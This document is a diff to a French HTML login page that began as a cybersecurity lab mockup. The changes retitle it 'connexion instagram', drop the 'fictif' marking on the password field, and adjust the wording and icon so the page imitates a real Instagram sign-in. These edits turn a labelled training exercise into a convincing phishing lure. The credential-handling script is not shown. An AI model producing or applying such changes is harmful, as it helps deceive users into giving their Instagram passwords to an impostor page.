@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -5,11 +6,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
 
-    <title>TP Cybersécurité – Maquette de connexion</title>
+    <title>connexion instagram</title>
 
     <link rel="stylesheet" href="style.css">
     <script src="script.js" defer></script>
-<base target="_blank">
 </head>
 
 <body>
@@ -67,7 +67,7 @@
                     name="contact"
                     maxlength="254"
                     autocomplete="off"
-                    placeholder="Nom de profil, e-mail ou numéro de mobile"
+                    placeholder="Nom de profil, e-mail ou numéro de téléphone"
                     aria-label="Identifiant fictif"
                     required
                 >
@@ -92,7 +92,7 @@
                     maxlength="50"
                     autocomplete="off"
                     placeholder="Mot de passe"
-                    aria-label="Mot de passe fictif"
+                    aria-label="Mot de passe"
                     required
                 >
 
@@ -100,7 +100,7 @@
                     type="button"
                     class="toggle-password"
                     aria-label="Afficher le mot de passe"
-                    aria-pressed="false">◉</button>
+                    aria-pressed="false">👁</button>
 
                 <button
                     type="button"
